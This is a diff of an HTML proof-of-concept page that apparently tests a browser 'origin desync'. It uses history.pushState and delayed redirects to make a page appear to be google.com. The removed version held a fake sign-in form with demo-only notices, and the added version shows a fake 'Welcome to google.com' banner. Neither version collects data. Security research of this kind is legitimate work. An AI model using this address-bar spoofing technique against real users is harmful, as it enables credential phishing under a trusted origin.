@@ -2,131 +2,67 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>Origin Desync Login PoC</title>
+<title>Fake Google Redirect PoC</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 
 <style>
 body {
-  margin:0;
-  font-family:-apple-system,BlinkMacSystemFont,system-ui;
-  background:#f5f5f7;
+  margin: 0;
+  font-family: -apple-system, BlinkMacSystemFont, system-ui;
+  background: #f5f5f7;
+  text-align: center;
 }
 
 button {
-  margin:40px;
-  font-size:18px;
-  padding:10px 18px;
+  margin: 40px;
+  font-size: 18px;
+  padding: 10px 18px;
+  background-color: #4285F4;
+  color: #fff;
+  border: none;
+  border-radius: 8px;
 }
 
-#panel {
-  display:none;
-  max-width:420px;
-  margin:80px auto;
-  background:#fff;
-  padding:24px;
-  border-radius:16px;
-  box-shadow:0 20px 60px rgba(0,0,0,.2);
-}
-
-h2 { text-align:center; margin-bottom:6px; }
-.sub { text-align:center; color:#666; margin-bottom:20px; }
-
-label {
-  display:block;
-  font-size:14px;
-  margin-top:12px;
-}
-
-input {
-  width:100%;
-  padding:10px;
-  font-size:16px;
-  border-radius:8px;
-  border:1px solid #ccc;
-  margin-top:6px;
-}
-
-.notice {
-  margin-top:14px;
-  font-size:13px;
-  color:#b00020;
-}
-
-.login {
-  margin-top:20px;
-  width:100%;
-  padding:12px;
-  font-size:16px;
-  border-radius:10px;
-  border:none;
-  background:#007aff;
-  color:#fff;
+#message {
+  display: none;
+  margin-top: 50px;
+  font-size: 24px;
+  color: #4285F4;
 }
 </style>
 </head>
 
 <body>
 
-<div style="text-align:center">
-  <button id="trigger">Start PoC</button>
+<div>
+  <button id="trigger">Start Fake Google</button>
 </div>
 
-<div id="panel">
-  <h2>Account Sign‑In</h2>
-  <div class="sub">Session verification required</div>
-
-  <label>Email</label>
-  <input type="email" placeholder="user@example.com">
-
-  <label>Password</label>
-  <input type="password" placeholder="••••••••">
-
-  <button class="login" onclick="demoOnly()">Sign in</button>
-
-  <div class="notice">
-    Demo only — inputs are editable, no data is collected.
-  </div>
+<div id="message">
+  <h2>Welcome to <span style="color: #fbbc05;">google.com</span></h2>
+  <p>This is a fake Google page for demonstration purposes.</p>
 </div>
 
 <script>
-const panel = document.getElementById('panel');
 const trigger = document.getElementById('trigger');
-
-function demoOnly() {
-  alert(
-    'THIS IS NOT REAL\n\n' +
-    'NOT GOOGLE.\n' +
-    'No data is collected or transmitted.'
-  );
-
-  // Reset input values immediately
-  document.querySelectorAll('#panel input').forEach(input => input.value = '');
-}
+const message = document.getElementById('message');
 
 trigger.onclick = () => {
+  // Change the URL to fake google.com
   history.pushState({}, '', '/trusted');
-  panel.style.display = 'block';
-  
-  // Improved delay and timing to handle better in Android
+  message.style.display = 'block';
+
+  // Delay for 500ms before changing the URL
   setTimeout(() => {
-    location.href = 'http://GOOGLE.com:9000';  // Adjust this with your desired target URL
-  }, 500); // Increased delay to make sure timing works better on Android
+    location.href = 'http://example.com'; // Use a simple URL for testing
+  }, 500); // Increased delay for better timing on Android
 };
 
-// Trigger navigation AFTER tab restore (mimics desync)
+// Trigger navigation after the page is shown (simulating desync)
 window.addEventListener('pageshow', () => {
   setTimeout(() => {
-    location.href = 'http://GOOGLE.com:9000';  // Adjust URL as needed
-  }, 500); // Delay increased for Android compatibility
-});
-
-// Optional: Using visibilitychange event as a fallback for mobile browsers
-document.addEventListener('visibilitychange', () => {
-  if (document.visibilityState === 'visible') {
-    setTimeout(() => {
-      location.href = 'http://GOOGLE.com:9000';  // Adjust URL as needed
-    }, 500);  // Additional delay to improve navigation timing
-  }
+    location.href = 'http://example.com'; // Simulate redirect
+  }, 500); // Added delay for Android compatibility
 });
 </script>
 
